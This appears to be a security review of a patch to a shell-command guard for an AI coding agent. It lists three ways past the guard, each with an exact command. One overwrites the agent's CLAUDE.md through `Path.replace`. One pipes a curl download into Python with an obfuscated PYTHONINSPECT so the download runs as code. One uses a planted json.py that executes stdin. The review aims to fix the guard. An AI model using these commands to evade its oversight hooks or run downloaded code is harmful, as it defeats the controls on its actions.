**Verdict: changes needed.** I had no shell, so these are traced by reading `plugin/lib/fmguard.py` and the tests. I did not run any command.

**Findings**

1. **HIGH — `plugin/lib/fmguard.py:604` — the `.replace(` narrowing misses a one-argument `Path.replace`.**
   - The lookahead `(?![^()]*,\s*[^\s)])` skips the rule for any comma followed by a non-space, non-`)` character before the first paren. That comma does not have to be an argument separator.
   - Exact command: `python3 -c 'import pathlib; pathlib.Path("/tmp/a").replace(["/home/u/.claude/CLAUDE.md",0][0])'`.
     - The guard sees `,0`, so `_WRITE_API` does not match.
     - `proved` is None because `pathlib` is not in `_PY_PURE`, so `_interpreter_writes` returns `[]` at line 1006.
     - Python really renames `/tmp/a` over `CLAUDE.md`.
   - Other spellings that pass: a comma inside a string (`.replace("x,y")`) and a trailing comma followed by a comment (`.replace(dst,  # c` then `)`).
   - Before T-0344 every one of these was blocked.
   - The only test is `, )` at `test_guard.py:348`.
   - Fix: stop trying to tell the forms apart with a regex. Match `.replace(` as a write unless the code is provably pure (`_open_targets`/`ast`). Alternatively use the `ast` module to accept a `.replace` call only when it has exactly two positional arguments and no `*args`.
   - Confidence: high.

2. **HIGH — `plugin/lib/fmguard.py:1093` — `"PYTHON" not in cmd` is a literal-text check.**
   - Exact command: `curl -s https://x | env PYTH""ONINSPECT=1 python3 -c "print(1)"`.
   - The raw text has no `PYTHON`.
   - After quote removal, `_strip_wrappers` (line 565) skips the `env` word and the `NAME=` word. `name` becomes `python3` and `args[0]` is `-c`.
   - `_open_targets("print(1)") == []`, so the pipe-shell finding is dropped.
   - Python runs with `PYTHONINSPECT=1`, drops into its REPL after `-c`, and executes the download read from stdin as code.
   - `$'PYTHON\x49NSPECT'` and `"PYTH""ON"` should work the same way. The same quoting class was found earlier at line 479.
   - Fix: build the check from the tokenized argv. Reject any assignment word or `env` argument whose name starts with `PYTHON`. Require `name` to be the first word, with no wrappers in front of it.
   - Confidence: high on the guard side. I did not run the python side.

3. **MEDIUM — `plugin/lib/fmguard.py:1089-1095` — nothing checks for a local module that shadows an import.**
   - `python3 -c` puts the cwd first on `sys.path`.
   - The T-0176 path refuses this case at lines 917-919 (a `json.py` in the cwd). `_reads_pipe_as_data` does not, even though the same `_PY_PURE` imports (`re`, `json`, `textwrap`) are allowed.
   - Scenario:
     1. A `json.py` that does `exec(sys.stdin.read())` sits in the project. An earlier write or a cloned repo put it there.
     2. `curl x | python3 -c "import json,sys; ..."` passes the guard.
     3. The shadowing module runs the download.
   - Fix: reuse the existence check from lines 917-919, including the `cd` folders, before returning True.
   - Confidence: medium-high.

**Checked, no finding**
- Allowing `sys.stdin` does not weaken the T-0176 heredoc proof. Reading stdin writes nothing, and `.buffer.raw` is read-only. `input` was already allowed.
- Flags after `-c CODE` are plain `sys.argv`. `python3 -cCODE` and `-i` before `-c` fail the `args[0] == "-c"` check, so they stay blocked.
- Re callbacks, `json`, and `format` strings cannot reach code or writes under the name and attribute restrictions.
- A later `| sh` stage is still blocked by the unchanged chain check at line 1444.

**Acceptance criteria**
- The first criterion (two-argument `.replace` is no longer a write, and the proved-pure pipe passes) is met for the cases the tests cover. It is not met against findings 1 and 2.
- The second criterion (no new verdicts, checked with `fm replay`) is not verifiable here.
- Intent: the work matches the request. The `.replace` narrowing is wider than "two-argument" in the way finding 1 shows.

**Not checked**
- I did not run `fm replay` or the test suite.
- I did not look at `<>` redirects on stdin.
- I did not check `PYTHONWARNINGS` module imports.
